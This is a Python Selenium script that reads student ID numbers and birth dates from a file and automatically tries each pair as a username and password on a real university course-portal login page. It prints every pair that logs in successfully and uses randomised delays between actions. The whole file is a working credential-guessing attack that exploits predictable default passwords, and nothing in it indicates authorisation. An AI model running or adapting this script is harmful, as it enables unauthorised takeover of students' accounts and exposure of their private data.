from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time
import random
import re

class VNU_UET():
    def __init__(self, data):
        self.i = 0
        self.data = data
        self.options = Options()
        
        #self.options.add_argument('--headless) optional
        self.options.add_argument('--no-sandbox')
        self.options.add_argument('--disable-dev-shm-usage')
        self.options.add_argument('--window-size=1920,1080')
        self.options.add_argument('--disable-infobars')
        self.options.add_argument('--disable-extensions')
        #self.options.add_argument('--disable-gpu') optional

        self.driver = webdriver.Chrome(options=self.options)
        #define the attribute of object
    def openChrome(self):
        self.driver.get('https://courses.uet.vnu.edu.vn/loginform/')
        #Open Chrome and navigate to the login page
    def login(self, username, password):
        try:
            self.user = self.driver.find_element(By.XPATH, '//*[@id="first-name"]')
            self.user.send_keys(username)
            #Find the username form and input username
            self.driver.implicitly_wait(random.randint(50,100)/100)

            self.passw = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div/form/div[2]/input')
            self.passw.send_keys(password)
            #Find the password form and input password
            self.driver.implicitly_wait(random.randint(50,100)/100)

            self.submit = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div/form/div[3]/button')
            self.submit.click()
            #Find the submit button and click
            return self.driver.current_url
            #Return the current url in order to check if login is success
        except:
            self.driver.get('https://courses.uet.vnu.edu.vn/loginform/')
            #If error occur, return the login page
    def logout(self):
        try:
            self.logoutname = self.driver.find_element(By.XPATH, '//*[@id="action-menu-toggle-0"]')
            self.logoutname.click()
            #Find the dropdown menu and click
            
            self.quit = self.driver.find_element(By.XPATH, '//*[@id="action-menu-0-menu"]/a[8]')
            self.quit.click()
            #Find the quit button and click
            
            self.driver.implicitly_wait(2)
            self.driver.get('https://courses.uet.vnu.edu.vn/loginform/')
            #Wait for 2 seconds before navigate to the first login form
        
        except:
            self.driver.get('https://courses.uet.vnu.edu.vn/loginform/')
            #If error occur, return the first login page
            
    def process(self):
        username = self.data[self.i][0]
        password = self.data[self.i][1]
        #Initiate the first pair of username and password
        while self.i < len(self.data) - 1:
            url = self.login(username, password)
            #Get the url 
            if url == 'https://courses.uet.vnu.edu.vn/my/':
                #If login success
                print(self.data[self.i][0] + ' ' + self.data[self.i][1])
                self.logout()
                self.i += 1
                username = self.data[self.i][0]
                password = self.data[self.i][1]
            else:
                #If login fail
                self.i += 1
                username = self.data[self.i][0]
                password = self.data[self.i][1]

def main():
    # Read and filter the data by regex
    filepath = r"data.txt"
    data = []
    with open(filepath, 'r', encoding="utf-8") as f:
        for text in f:
            name = re.search(r"(\d{8})", text).group(0)
            dob = re.search(r"\d{2}/\d{2}/\d{4}", text).group(0)
            dob = re.sub(r"/", "", dob)
            data.append([name, dob])
    
    # Initiate the object test
    test = VNU_UET(data)
    test.openChrome()
    test.process()

if __name__ == "__main__":
    main()
